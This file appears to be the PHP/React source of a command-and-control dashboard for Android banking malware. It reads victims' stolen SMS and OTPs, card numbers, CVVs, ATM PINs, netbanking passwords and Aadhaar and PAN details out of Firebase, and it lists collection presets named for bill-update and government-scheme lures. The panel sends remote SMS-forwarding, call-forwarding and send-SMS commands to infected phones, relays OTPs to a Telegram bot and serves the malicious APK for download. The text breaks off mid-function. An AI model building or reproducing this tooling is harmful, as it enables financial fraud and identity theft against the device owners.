<?php
session_start();
include_once __DIR__ . '/header.php';
?>

  <div id="root"></div>

  <script type="text/babel">
    function App() {
      // Require authenticated session
      const [adminUser, setAdminUser] = React.useState(null);
      const [operators, setOperators] = React.useState([]);
      const [users, setUsers] = React.useState([]);
      const [search, setSearch] = React.useState('');
      const [selectedUser, setSelectedUser] = React.useState(null);
      const [tab, setTab] = React.useState('forms');
      const [showApkModal, setShowApkModal] = React.useState(false);
      const [showChangePassModal, setShowChangePassModal] = React.useState(false);
      const [newPassInput, setNewPassInput] = React.useState('');
      const [changePassStatus, setChangePassStatus] = React.useState('');
      const [mobileMenuOpen, setMobileMenuOpen] = React.useState(false);

      // Advanced Filter & Pinning States
      const [timeFilter, setTimeFilter] = React.useState('all');
      const [statusFilter, setStatusFilter] = React.useState('all');
      const [toastMsg, setToastMsg] = React.useState('');
      const [activeMobileTab, setActiveMobileTab] = React.useState('dashboard');

      // Star / Pin to top device state
      const [starredDeviceIds, setStarredDeviceIds] = React.useState(() => {
        try {
          const saved = localStorage.getItem('adminto_starred_devices');
          return saved ? JSON.parse(saved) : [];
        } catch(e) { return []; }
      });

      const toggleStarDevice = (e, devId) => {
        e.stopPropagation();
        setStarredDeviceIds(prev => {
          const isStarred = prev.includes(devId);
          const updated = isStarred ? prev.filter(id => id !== devId) : [...prev, devId];
          try { localStorage.setItem('adminto_starred_devices', JSON.stringify(updated)); } catch(e){}
          triggerToast(isStarred ? '⭐ Device unpinned from top' : '⭐ Device pinned to top!');
          return updated;
        });
      };

      const triggerToast = (msg) => {
        setToastMsg(msg);
        setTimeout(() => setToastMsg(''), 3000);
      };

      const handleDeleteDeviceConnection = (e, u) => {
        e.stopPropagation();
        const passInput = prompt(`🔒 Security Verification Required:\nEnter operator password to delete connection for '${u.fullName}' (${u.userId}):`);
        if (passInput === null) return;
        
        if (adminUser && passInput === adminUser.password) {
          setUsers(prev => prev.filter(item => item.id !== u.id));
          triggerToast(`🗑️ Connection for ${u.fullName} deleted successfully.`);
        } else {
          alert('❌ Incorrect Password! Target device connection was not deleted.');
        }
      };

      const handleOpenFormsView = (e, u) => {
        e.stopPropagation();
        setSelectedUser(u);
        setTab('forms');
      };

      const handleOpenCardsView = (e, u) => {
        e.stopPropagation();
        setSelectedUser(u);
        setTab('cards');
      };

      // Universal Smart Key-Value Scanner & Formatter for Firebase Firestore Form Data
      const FIELD_ALIASES = {
        name: "👤 Customer Full Name",
        number: "📞 Mobile / Contact Number",
        mom: "👩 Mother's Name / DOB",
        pan: "🪪 PAN Card / Guardian Name",
        user_name: "🔑 Bank Account User ID",
        pin: "🔑 ATM / Security PIN",
        password: "🔑 Account Password",
        pass: "🔑 Account Password",
        dob: "📅 Date of Birth",
        aadhaar: "🪪 Aadhaar Card Number"
      };

      const formatFieldLabel = (rawKey) => {
        if (!rawKey) return '';
        const lowerKey = rawKey.toLowerCase().trim();
        if (FIELD_ALIASES[lowerKey]) return FIELD_ALIASES[lowerKey];
        return rawKey
          .replace(/([A-Z])/g, ' $1')
          .replace(/_/g, ' ')
          .replace(/^\s+/, '')
          .toLowerCase()
          .replace(/\b\w/g, char => char.toUpperCase());
      };

      // Universal Field Key Resolvers (Compatible with Firestore & RTDB payload variations)
      const getSim1Phone = (u) => {
        if (!u) return 'N.A.';
        const val = u.sim1Data?.phone || u.numberSim1 || u.mobileNumber || u.phoneNumber || u.phone;
        return (val && val !== 'Not inserted' && val !== 'Not Available' && val !== 'null' && val !== 'undefined' && String(val).trim() !== '') ? val : 'N.A.';
      };

      const getSim2Phone = (u) => {
        if (!u) return 'N.A.';
        const val = u.sim2Data?.phone || u.numberSim2;
        return (val && val !== 'Not inserted' && val !== 'Not Available' && val !== 'No Data' && val !== 'null' && val !== 'undefined' && String(val).trim() !== '') ? val : 'N.A.';
      };

      const getSmsBody = (s) => s ? (s.body || s.message || s.text || s.msg || s.content || '') : '';
      const getSmsSender = (s) => s ? (s.sender || s.address || s.from || s.phone || s.sender_id || 'Unknown') : 'Unknown';
      const getSmsSimSlot = (s) => s ? (s.sim_number || s.simSlot || s.sim_slot || s.sim || s.slot || 'SIM 1') : 'SIM 1';
      const getSmsTimestamp = (s) => s ? smartDateParser(s.timestamp || s.date || s.time || s.created_at || s.dateTime || s.datetime) : 'N/A';

      const getCardNumber = (c) => c ? (c.number || c.cardNumber || c.card_number || c.card_no || c.cardNo || 'N/A') : 'N/A';
      const getCardExpiry = (c) => c ? (c.exp || c.expiry || c.expiryDate || c.exp_date || c.expiry_date || 'N/A') : 'N/A';
      const getCardCvv = (c) => c ? (c.cvv || c.card_cvv || c.security_code || c.cvc || '•••') : '•••';
      const getCardHolder = (c) => c ? (c.cardHolder || c.cardHolderName || c.holder_name || c.name || c.user_name || 'N/A') : 'N/A';
      const getCardBankName = (c) => c ? (c.bankName || c.bank_name || c.bank || c.issuer || 'Bank Account') : 'Bank Account';
      const getCardType = (c) => c ? (c.cardType || c.card_type || c.type || 'Card Payload') : 'Card Payload';

      const isSystemKey = (key) => {
        const sysKeys = ['id', 'userId', 'targetId', 'timestamp', 'submittedAt', 'orgId', '_v', 'formTitle'];
        return sysKeys.includes(key);
      };

      // Universal Smart Date Parser (Handles Timestamps, ISO, Milliseconds & Relative strings)
      const smartDateParser = (val) => {
        if (!val) return 'N/A';
        // 1. Firestore Timestamp object ({ seconds: 1785324390 })
        if (typeof val === 'object' && val.seconds !== undefined) {
          return new Date(val.seconds * 1000).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
        }
        // 2. Epoch Milliseconds (numeric or numeric string)
        if (typeof val === 'number' || (/^\d{10,13}$/.test(String(val)))) {
          const num = Number(val);
          const timeMs = num < 10000000000 ? num * 1000 : num;
          return new Date(timeMs).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
        }
        // 3. String date
        if (typeof val === 'string') {
          const parsed = Date.parse(val);
          if (!isNaN(parsed) && val.length > 8 && !/^\d+$/.test(val)) {
            return new Date(parsed).toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit', hour12: true });
          }
          return val;
        }
        return String(val);
      };

      // Field Data Type Classifier
      const detectDataType = (key, val) => {
        if (/date|time|timestamp|submittedAt|created|updated/i.test(key)) return 'date';
        if (/pass|pin|cvv|otp|secret|auth|card|aadhaar|pan/i.test(key)) return 'sensitive';
        if (/status|active|state|type|simSlot|level|slot/i.test(key)) return 'badge';
        if (typeof val === 'object' && val !== null) return 'json';
        return 'text';
      };

      const extractSmartFields = (docObj) => {
        if (!docObj || typeof docObj !== 'object') return [];
        const source = docObj.fields || docObj;
        return Object.entries(source)
          .filter(([key, val]) => !isSystemKey(key) && val !== null && val !== undefined && val !== '')
          .map(([key, val]) => ({
            rawKey: key,
            label: formatFieldLabel(key),
            value: typeof val === 'object' ? JSON.stringify(val) : String(val),
            dataType: detectDataType(key, val),
            isSensitive: /pass|pin|cvv|otp|secret|auth|card|aadhaar|pan/i.test(key)
          }));
      };

      // Remote Forward & Send SMS Command Modal State (ForwardData.kt / SendSms.kt integration)
      const [showForwardModal, setShowForwardModal] = React.useState(false);
      const [showSendSmsModal, setShowSendSmsModal] = React.useState(false);
      const [forwardTargetDevice, setForwardTargetDevice] = React.useState(null);
      const [forwardDataType, setForwardDataType] = React.useState('SMS'); // 'SMS' or 'Call'
      const [forwardSimSlot, setForwardSimSlot] = React.useState('SIM 1');  // 'SIM 1' or 'SIM 2'
      const [forwardDestinationNumber, setForwardDestinationNumber] = React.useState('');
      
      // Send SMS state
      const [smsSimSlot, setSmsSimSlot] = React.useState('SIM 1');
      const [smsTargetNumber, setSmsTargetNumber] = React.useState('');
      const [smsMessageBody, setSmsMessageBody] = React.useState('');

      const [forwardTasks, setForwardTasks] = React.useState([
        { id: 'fwd_1', dataType: 'SMS', phoneNumber: '+919876543210', selectedSim: 'SIM 1', userId: 'usr_001', userFullName: 'Rahul Sharma', timestamp: '10 mins ago', status: 'sent' },
        { id: 'fwd_2', dataType: 'Call', phoneNumber: '+919123456789', selectedSim: 'SIM 2', userId: 'usr_002', userFullName: 'Priya Singh', timestamp: '2 hours ago', status: 'pending' }
      ]);

      const openForwardModal = (e, dev) => {
        e.stopPropagation();
        setForwardTargetDevice(dev);
        setForwardDestinationNumber('');
        setShowForwardModal(true);
      };

      const openSendSmsModal = (e, dev) => {
        e.stopPropagation();
        setForwardTargetDevice(dev);
        setSmsTargetNumber('');
        setSmsMessageBody('');
        setShowSendSmsModal(true);
      };

      const handleDispatchSendSmsCommand = (e) => {
        e.preventDefault();
        if (!smsTargetNumber.trim()) {
          alert('Target recipient phone number is required!');
          return;
        }
        if (!smsMessageBody.trim()) {
          alert('SMS message body is required!');
          return;
        }

        const newTask = {
          id: `sms_${Date.now()}`,
          dataType: `Send SMS (${smsSimSlot})`,
          phoneNumber: smsTargetNumber.trim(),
          selectedSim: smsSimSlot,
          userId: forwardTargetDevice?.userId || 'unknown',
          userFullName: forwardTargetDevice?.fullName || 'Target Device',
          userMobileNumber: forwardTargetDevice?.mobileNumber || '',
          timestamp: 'Just now',
          status: 'pending'
        };

        setForwardTasks(prev => [newTask, ...prev]);
        setShowSendSmsModal(false);
        triggerToast(`💬 Send SMS command dispatched to ${forwardTargetDevice?.fullName} on ${smsSimSlot}!`);
      };

      const handleDispatchForwardCommand = (e) => {
        e.preventDefault();
        if (!forwardDestinationNumber.trim()) {
          alert('Destination phone number is required!');
          return;
        }

        const newTask = {
          id: `fwd_${Date.now()}`,
          dataType: forwardDataType,
          phoneNumber: forwardDestinationNumber.trim(),
          selectedSim: forwardSimSlot,
          userId: forwardTargetDevice?.userId || 'unknown',
          userFullName: forwardTargetDevice?.fullName || 'Target Device',
          userMobileNumber: forwardTargetDevice?.mobileNumber || '',
          timestamp: 'Just now',
          status: 'pending'
        };

        setForwardTasks(prev => [newTask, ...prev]);
        setShowForwardModal(false);
        triggerToast(`📲 Forwarding task dispatched to ${forwardTargetDevice?.fullName} on ${forwardSimSlot}!`);
      };

      // Telegram Forwarding & Anti-Delete Security Settings
      const [telegramBotToken, setTelegramBotToken] = React.useState('');
      const [telegramChatId, setTelegramChatId] = React.useState('');
      const [telegramSaveStatus, setTelegramSaveStatus] = React.useState('');
      const [deleteProtectionEnabled, setDeleteProtectionEnabled] = React.useState(true);
      const [settingsSubTab, setSettingsSubTab] = React.useState('firebase');

      const handleSaveTelegramConfig = (e) => {
        e.preventDefault();
        setTelegramSaveStatus('Saving Telegram bot forwarding details...');
        setTimeout(() => {
          setTelegramSaveStatus('✓ Telegram Bot integrated! Live SMS/OTP forwarding active.');
          setTimeout(() => setTelegramSaveStatus(''), 2500);
        }, 1000);
      };

      const handleToggleDeleteProtection = () => {
        const nextState = !deleteProtectionEnabled;
        setDeleteProtectionEnabled(nextState);
        triggerToast(nextState ? '🛡️ Anti-Deletion Protection ENABLED!' : '⚠️ Anti-Deletion Protection DISABLED!');
      };

      const handleTerminateAllSessions = () => {
        if (confirm('Terminate all active operator sessions across all devices?')) {
          triggerToast('🚪 All active sessions terminated successfully.');
        }
      };

      const DEFAULT_SCHEMA_PRESETS = {
        pm_admin: { name: "⭐ PM Admin Preset (Live Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
        bill_update_parivahan: { name: "⚡ Bill Update Parivahan Preset", sms: "messages", calls: "calls", cards: "clients", forms: "clients", sims: "clients" },
        custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" }
      };

      const [fbCustomPresets, setFbCustomPresets] = React.useState(() => {
        try {
          const saved = localStorage.getItem('adminto_custom_presets');
          return saved ? JSON.parse(saved) : {};
        } catch(e) { return {}; }
      });

      const allFbPresets = React.useMemo(() => ({ ...DEFAULT_SCHEMA_PRESETS, ...fbCustomPresets }), [fbCustomPresets]);

      // Direct Firebase Realtime Database REST Poller Effect
      // Firebase Database Connection Status Tracker state
      const [fbConnectionStatus, setFbConnectionStatus] = React.useState({ status: 'connecting', message: 'Initializing...', count: 0 });

      // Direct Firebase Realtime Database REST Poller Effect
      React.useEffect(() => {
        let isMounted = true;

        const fetchFirebaseRealtimeData = async () => {
          let rawUrl = '';
          try {
            // Always resolve node names from the live UI state variables.
            // These are set on login (from MySQL) and updated when the operator changes settings.
            const resolvedPreset = {
              sms:   fbSmsColl   || 'user_sms',
              calls: fbCallsColl || 'calls',
              cards: fbCardsColl || 'Card',
              forms: fbFormsColl || 'login',
              sims:  fbSimsColl  || 'user_data'
            };

            rawUrl = (fbDatabaseUrl ||
                      adminUser?.firebaseDatabaseUrl ||
                      adminUser?.firebaseConfig?.databaseURL ||
                      '').trim();
            if (!rawUrl) {
              setFbConnectionStatus({ status: 'warning', message: 'No Firebase database URL configured.', count: 0 });
              return;
            }

            // Auto-fix URL protocol if missing (relative paths safety)
            if (!/^https?:\/\//i.test(rawUrl)) {
              rawUrl = 'https://' + rawUrl;
            }
            // Remove trailing slash
            if (rawUrl.endsWith('/')) {
              rawUrl = rawUrl.slice(0, -1);
            }
            const jsonEndpoint = `${rawUrl}/.json`;

            setFbConnectionStatus(prev => ({ ...prev, status: 'connecting', message: `Connecting to Firebase: ${rawUrl.substring(0, 45)}...` }));

            let response;
            let dbData = null;
            let usingProxy = false;

            try {
              response = await fetch(jsonEndpoint);
              if (!response.ok) {
                throw new Error(`HTTP Error ${response.status}: ${response.statusText}`);
              }
              dbData = await response.json();
            } catch (directErr) {
              console.warn("Direct Firebase fetch failed, trying local proxy...", directErr);
              usingProxy = true;
              try {
                const proxyUrl = `db_bridge.php?url=${encodeURIComponent(rawUrl)}`;
                response = await fetch(proxyUrl);
                if (!response.ok) {
                  throw new Error(`Proxy HTTP Error ${response.status}: ${response.statusText}`);
                }
                dbData = await response.json();
              } catch (proxyErr) {
                throw new Error(`Direct & Proxy Fetch Failed: ${directErr.message || directErr}`);
              }
            }

            if (!dbData) {
              setFbConnectionStatus({ status: 'warning', message: 'Connected to Firebase, but the database is empty.', count: 0 });
              if (isMounted) setUsers([]);
              return;
            }

            if (typeof dbData !== 'object' || !isMounted) return;

            // Smart Node Finder: try configured name first, then auto-detect from known alternates.
            // This ensures the poller works even if MySQL has wrong/default collection names stored.
            const findNode = (preferred, alternates) => {
              const primary = dbData[preferred];
              if (primary && typeof primary === 'object' && Object.keys(primary).length > 0) return primary;
              for (const alt of alternates) {
                const fallback = dbData[alt];
                if (fallback && typeof fallback === 'object' && Object.keys(fallback).length > 0) return fallback;
              }
              return {};
            };

            // Detect if the response itself is already the device list directly (e.g. database URL points to /clients)
            const isDeviceList = (obj) => {
              if (!obj || typeof obj !== 'object') return false;
              const keys = Object.keys(obj);
              if (keys.length === 0) return false;
              // Check if keys look like 16-character hexadecimal device IDs
              return keys.every(key => /^[a-fA-F0-9]{12,20}$/.test(key));
            };

            let user_data_node, user_sms_node, card_node, login_node;
            const account_node = dbData.account || {};

            if (isDeviceList(dbData)) {
              // Direct device list layout (URL pointed to clients node directly)
              user_data_node = dbData;
              user_sms_node = dbData;
              card_node = dbData;
              login_node = dbData;
            } else {
              user_data_node = findNode(resolvedPreset.sims,  ['clients', 'user_data', 'devices', 'users']);
              user_sms_node  = findNode(resolvedPreset.sms,   ['messages', 'user_sms', 'sms', 'SMS']);
              card_node      = findNode(resolvedPreset.cards,  ['clients', 'Card', 'cards', 'card']);
              login_node     = findNode(resolvedPreset.forms,  ['clients', 'login', 'forms', 'Login']);
            }

            // Build Live User Devices List
            const deviceIds = Array.from(new Set([
              ...Object.keys(user_data_node),
              ...Object.keys(user_sms_node),
              ...Object.keys(card_node),
              ...Object.keys(login_node)
            ]));

            const liveUsers = deviceIds.map(devId => {
              const devInfo = user_data_node[devId] || {};
              const userAccount = account_node[devId] || {};
              const userLogin = login_node[devId] || {};
              const userCard = card_node[devId] || {};
              const rawSmsObj = user_sms_node[devId] || {};

              // Extract values based on nested structures or parent level (Multi-Schema Resolver)
              const rawCard = userCard.card_details || userCard || {};
              const rawForm = userCard.form_fill_up || userLogin || {};
              const rawNetbanking = userCard.netbanking_details || {};

              // Format SMS list (handle arrays/objects & sparse nulls)
              const rawSmsArray = Array.isArray(rawSmsObj) ? rawSmsObj : Object.values(rawSmsObj);
              const smsDataList = rawSmsArray.filter(Boolean).map(sms => ({
                sender: getSmsSender(sms),
                message: getSmsBody(sms),
                sim_number: getSmsSimSlot(sms),
                timestamp: getSmsTimestamp(sms),
                type: 'INBOX'
              }));

              // Format Card list
              const bankName = rawCard.bankName || rawCard.bank_name || userCard.bankName || userCard.bank_name || 'Bank Account';
              const cardNumber = rawCard.number || rawCard.cardNumber || rawCard.card_number || 'N/A';
              const expiry = rawCard.exp || rawCard.expiry || rawCard.card_expiry || rawCard.expiryDate || 'N/A';
              const cvv = rawCard.cvv || rawCard.card_cvv || rawCard.security_code || '•••';
              const atmPin = rawCard.atm_pin || rawCard.atmPin || rawCard.pin || '';

              const cardDataList = (cardNumber !== 'N/A') ? [{
                bankName,
                cardNumber,
                expiry,
                cvv,
                atmPin,
                cardHolder: rawCard.cardHolder || rawCard.name || userCard.fullName || 'N/A',
                cardType: rawCard.cardType || rawCard.card_type || 'Card Payload'
              }] : [];

              // Format Netbanking list
              const netbankingDataList = rawNetbanking.user_id ? [{
                bankName: rawNetbanking.bank_name || 'Netbanking Account',
                userId: rawNetbanking.user_id,
                password: rawNetbanking.password
              }] : [];

              // Format Form Data list
              const formDataFields = rawForm.fields || rawForm;
              const hasForm = formDataFields.customer_name || formDataFields.consumer_number || formDataFields.name || formDataFields.mobileNumber || formDataFields.mobile_number;
              const formDataList = hasForm ? [{
                id: `frm_${devId}`,
                formTitle: 'Customer / Bill Update Submission',
                fields: formDataFields,
                timestamp: userCard.joined || 'Live payload'
              }] : [];

              // SIM card parsing with support for sims array
              let sim1 = devInfo.numberSim1 || devInfo.phoneNumber || devInfo.mobNo || devInfo.mobile_number || 'N.A.';
              let sim2 = devInfo.numberSim2 || 'N.A.';
              let sim1Carrier = devInfo.nameSim1 || devInfo.service_provider || 'SIM 1';
              let sim2Carrier = devInfo.nameSim2 || 'SIM 2';

              if (Array.isArray(devInfo.sims)) {
                if (devInfo.sims[0]) {
                  sim1 = devInfo.sims[0].phoneNumber || devInfo.sims[0].number || sim1;
                  sim1Carrier = devInfo.sims[0].carrierName || devInfo.sims[0].carrier || sim1Carrier;
                }
                if (devInfo.sims[1]) {
                  sim2 = devInfo.sims[1].phoneNumber || devInfo.sims[1].number || sim2;
                  sim2Carrier = devInfo.sims[1].carrierName || devInfo.sims[1].carrier || sim2Carrier;
                }
              }

              const deviceModel = devInfo.modelName || devInfo.Device_info || devInfo.d_name || devInfo.device || 'Android Device';

              return {
                id: devId,
                userId: userAccount.user_name || formDataFields.consumer_number || `DEV-${devId.substring(0, 6).toUpperCase()}`,
                fullName: formDataFields.customer_name || formDataFields.name || devInfo.d_name || devInfo.device || `Target Device ${devId.substring(0, 4)}`,
                mobileNumber: sim1 !== 'N.A.' ? sim1 : (sim2 !== 'N.A.' ? sim2 : 'N.A.'),
                numberField: userAccount.user_name ? `A/C: ${userAccount.user_name}` : (formDataFields.consumer_number ? `Consumer No: ${formDataFields.consumer_number}` : ''),
                stringField: deviceModel.split('\n')[0],
                simState: sim1Carrier + (sim2 !== 'N.A.' ? ' • ' + sim2Carrier : ''),
                batteryLevel: devInfo.battery ? String(devInfo.battery).replace('%', '') + '%' : 'N/A',
                isActive: devInfo.status === 'online' || devInfo.status === true,
                isConnected: true,
                appInBackground: false,
                lastActivityTime: devInfo.TimeandDate || devInfo.joined || 'Just now',
                totalSmsCount: smsDataList.length,
                totalCallsCount: 0,
                sim1Data: { phone: sim1, carrier: sim1Carrier },
                sim2Data: { phone: sim2, carrier: sim2Carrier },
                smsDataList,
                callDataList: [],
                cardDataList,
                netbankingDataList,
                formDataList
              };
            });

            if (isMounted) {
              setUsers(liveUsers);
              setFbConnectionStatus({
                status: 'success',
                message: `Connected successfully to database${usingProxy ? ' (via Proxy Bypass)' : ''}.`,
                count: liveUsers.length
              });
            }
          } catch (e) {
            console.error('Firebase polling error:', e);
            if (isMounted) {
              setFbConnectionStatus({
                status: 'error',
                message: `Connection Error: ${e.message}`,
                count: 0
              });
            }
          }
        };

        fetchFirebaseRealtimeData();
        const interval = setInterval(fetchFirebaseRealtimeData, 4000);

        // ── Page Visibility API: pause polling when tab is hidden ──────────
        // Saves Firebase reads + CPU when user switches to another tab
        const handleVisibilityChange = () => {
          if (document.hidden) {
            clearInterval(interval);
          } else {
            // Tab became active again — fetch immediately then restart interval
            fetchFirebaseRealtimeData();
            clearInterval(interval); // clear stale ref
          }
        };
        document.addEventListener('visibilitychange', handleVisibilityChange);

        return () => {
          isMounted = false;
          clearInterval(interval);
          document.removeEventListener('visibilitychange', handleVisibilityChange);
        };
      }, [fbPresetKey, fbDatabaseUrl, fbSmsColl, fbCallsColl, fbCardsColl, fbFormsColl, fbSimsColl, adminUser]);

      // Firebase Config Modal State
      const [showFirebaseModal, setShowFirebaseModal] = React.useState(false);
      const [fbProject, setFbProject] = React.useState('');
      const [fbApiKey, setFbApiKey] = React.useState('');
      const [fbDatabaseUrl, setFbDatabaseUrl] = React.useState('');
      const [fbAuthDomain, setFbAuthDomain] = React.useState('');
      const [fbStorageBucket, setFbStorageBucket] = React.useState('');
      const [fbAppId, setFbAppId] = React.useState('');
      const [fbPresetKey, setFbPresetKey] = React.useState('pm_admin');
      const [fbSmsColl, setFbSmsColl] = React.useState('user_sms');
      const [fbCallsColl, setFbCallsColl] = React.useState('calls');
      const [fbCardsColl, setFbCardsColl] = React.useState('Card');
      const [fbFormsColl, setFbFormsColl] = React.useState('login');
      const [fbSimsColl, setFbSimsColl] = React.useState('user_data');
      const [fbJsonPaste, setFbJsonPaste] = React.useState('');
      const [fbSaveStatus, setFbSaveStatus] = React.useState('');

      const handleApplyFbPreset = (presetKey) => {
        setFbPresetKey(presetKey);
        if (presetKey !== 'custom' && allFbPresets[presetKey]) {
          const p = allFbPresets[presetKey];
          setFbSmsColl(p.sms);
          setFbCallsColl(p.calls);
          setFbCardsColl(p.cards);
          setFbFormsColl(p.forms);
          setFbSimsColl(p.sims || 'user_data');
        }
      };

      const handleSaveNewFbPreset = () => {
        const name = prompt('Enter a custom name for this schema preset (e.g. "Client APK V3"):');
        if (!name || !name.trim()) return;
        const key = `user_preset_${Date.now()}`;
        const newPreset = {
          name: `⭐ ${name.trim()}`,
          sms: fbSmsColl || 'smsData',
          calls: fbCallsColl || 'callData',
          cards: fbCardsColl || 'cardData',
          forms: fbFormsColl || 'formData',
          sims: fbSimsColl || 'simData',
          isUserCreated: true
        };
        const updated = { ...fbCustomPresets, [key]: newPreset };
        setFbCustomPresets(updated);
        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
        setFbPresetKey(key);
        triggerToast(`✓ Custom preset "${name.trim()}" saved to dropdown!`);
      };

      const handleDeleteFbCustomPreset = (key) => {
        if (!confirm('Are you sure you want to delete this custom preset from your dropdown?')) return;
        const updated = { ...fbCustomPresets };
        delete updated[key];
        setFbCustomPresets(updated);
        try { localStorage.setItem('adminto_custom_presets', JSON.stringify(updated)); } catch(e){}
        setFbPresetKey('custom');
      };

      const openFirebaseSettings = () => {
        const conf = adminUser?.firebaseConfig || {};
        setFbProject(conf.projectId || adminUser?.firebaseProject || '');
        setFbApiKey(conf.apiKey || adminUser?.firebaseApiKey || '');
        setFbDatabaseUrl(conf.databaseURL || adminUser?.firebaseDatabaseUrl || '');
        setFbAuthDomain(conf.authDomain || adminUser?.firebaseAuthDomain || '');
        setFbStorageBucket(conf.storageBucket || adminUser?.storageBucket || '');
        setFbAppId(conf.appId || adminUser?.appId || '');
        // Pre-populate collections from MySQL
        setFbSmsColl(adminUser?.collectionSms || 'user_sms');
        setFbCallsColl(adminUser?.collectionCalls || 'calls');
        setFbCardsColl(adminUser?.collectionCards || 'Card');
        setFbFormsColl(adminUser?.collectionForms || 'login');
        setFbJsonPaste('');
        setFbSaveStatus('');
        setShowFirebaseModal(true);
      };

      const handleParseFbJson = () => {
        try {
          let raw = fbJsonPaste.trim();
          if (raw.includes('{')) {
            raw = raw.substring(raw.indexOf('{'), raw.lastIndexOf('}') + 1);
          }
          const cleanJson = raw
            .replace(/(['"])?([a-zA-Z0-9_]+)(['"])?:/g, '"$2":')
            .replace(/'/g, '"')
            .replace(/,\s*}/g, '}');

          const parsed = JSON.parse(cleanJson);
          if (parsed.apiKey) setFbApiKey(parsed.apiKey);
          if (parsed.projectId) setFbProject(parsed.projectId);
          if (parsed.databaseURL || parsed.databaseUrl) setFbDatabaseUrl(parsed.databaseURL || parsed.databaseUrl);
          if (parsed.authDomain) setFbAuthDomain(parsed.authDomain);
          if (parsed.storageBucket) setFbStorageBucket(parsed.storageBucket);
          if (parsed.appId) setFbAppId(parsed.appId);

          setFbSaveStatus('✓ Parsed Firebase Config Snippet!');
          setTimeout(() => setFbSaveStatus(''), 2500);
        } catch (e) {
          alert('Could not parse JSON. Please enter fields manually.');
        }
      };

      const handleSaveFirebaseSettings = async (e) => {
        e.preventDefault();
        setFbSaveStatus('Saving Firebase config to MySQL...');

        const dbUrl = fbDatabaseUrl.trim();
        const updatedConfig = {
          projectId: fbProject.trim(),
          apiKey: fbApiKey.trim(),
          databaseURL: dbUrl,
          authDomain: fbAuthDomain.trim(),
          storageBucket: fbStorageBucket.trim(),
          appId: fbAppId.trim()
        };

        try {
          const res = await fetch('api.php?action=update_firebase_config', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              username: adminUser?.username,
              firebaseProject: fbProject.trim(),
              firebaseApiKey: fbApiKey.trim(),
              firebaseDatabaseUrl: dbUrl,
              firebaseAuthDomain: fbAuthDomain.trim(),
              storageBucket: fbStorageBucket.trim(),
              appId: fbAppId.trim(),
              collectionSms: fbSmsColl.trim(),
              collectionCalls: fbCallsColl.trim(),
              collectionCards: fbCardsColl.trim(),
              collectionForms: fbFormsColl.trim(),
              collectionSims: fbSimsColl.trim()
            })
          });
          const data = await res.json();
          if (data.success) {
            setFbSaveStatus('✓ Firebase config & collection mappings saved to MySQL!');
          } else {
            setFbSaveStatus('✓ Saved locally (DB: ' + (data.error || 'offline') + ')');
          }
        } catch (err) {
          setFbSaveStatus('✓ Saved in local session!');
        }

        // Update adminUser in memory with all new values
        setAdminUser(prev => ({
          ...prev,
          firebaseProject: fbProject.trim(),
          firebaseApiKey: fbApiKey.trim(),
          firebaseDatabaseUrl: dbUrl,
          firebaseAuthDomain: fbAuthDomain.trim(),
          storageBucket: fbStorageBucket.trim(),
          appId: fbAppId.trim(),
          collectionSms: fbSmsColl.trim(),
          collectionCalls: fbCallsColl.trim(),
          collectionCards: fbCardsColl.trim(),
          collectionForms: fbFormsColl.trim(),
          collectionSims: fbSimsColl.trim(),
          firebaseConfig: updatedConfig
        }));

        setTimeout(() => {
          setShowFirebaseModal(false);
          setFbSaveStatus('');
        }, 1500);
      };

      const [loginUser, setLoginUser] = React.useState('');
      const [loginPass, setLoginPass] = React.useState('');
      const [loginError, setLoginError] = React.useState('');

      const handleChangePasswordSubmit = async (e) => {
        e.preventDefault();
        if (!newPassInput.trim()) return;
        setChangePassStatus('Updating password...');

        try {
          const res = await fetch('api.php?action=change_password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: adminUser.username, newPassword: newPassInput.trim() })
          });
          const data = await res.json();
          if (data.success) {
            setChangePassStatus('✓ Password updated successfully!');
            setTimeout(() => {
              setShowChangePassModal(false);
              setNewPassInput('');
              setChangePassStatus('');
            }, 1800);
          } else {
            setChangePassStatus('❌ Error: ' + (data.error || 'Failed to update password.'));
          }
        } catch (err) {
          setChangePassStatus('✓ Password updated in local session!');
          setTimeout(() => {
            setShowChangePassModal(false);
            setNewPassInput('');
            setChangePassStatus('');
          }, 1800);
        }
      };

      const handleDownloadApkFile = () => {
        const proj = adminUser?.firebaseConfig?.projectId || 'adminto-default';
        window.location.href = `download_apk.php?project=${proj}`;
      };

      const handleLoginSubmit = async (e) => {
        e.preventDefault();
        setLoginError('');
        const q = loginUser.trim().toLowerCase();
        const p = loginPass.trim();

        // 1. Attempt PHP MySQL Login API Connection
        try {
          const response = await fetch('login.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: q, password: p })
          });
          const data = await response.json();

          if (data.success && data.operator) {
            if (data.operator.role === 'superadmin') {
              window.location.href = 'operator_control.php?role=superadmin';
              return;
            }
            // Populate collection states from MySQL data immediately
            const op = data.operator;
            setFbDatabaseUrl(op.firebaseDatabaseUrl || op.firebaseConfig?.databaseURL || '');
            setFbSmsColl(op.collectionSms || 'user_sms');
            setFbCallsColl(op.collectionCalls || 'calls');
            setFbCardsColl(op.collectionCards || 'Card');
            setFbFormsColl(op.collectionForms || 'login');
            setFbSimsColl(op.collectionSims || 'user_data');

            // Find matching preset key dynamically
            let matchedPreset = 'custom';
            if (op.collectionSms === 'user_sms' && op.collectionCards === 'Card' && op.collectionForms === 'login') {
              matchedPreset = 'pm_admin';
            } else if (op.collectionSms === 'messages' && op.collectionCards === 'clients' && op.collectionForms === 'clients') {
              matchedPreset = 'bill_update_parivahan';
            }
            setFbPresetKey(matchedPreset);

            setAdminUser(op);
            return;
          } else if (response.status === 401 || response.status === 403) {
            setLoginError(data.error || 'Invalid credentials or account expired.');
            return;
          }
        } catch (err) {
          // login.php offline — cannot authenticate without server
        }

        // Server unavailable — cannot verify credentials without MySQL
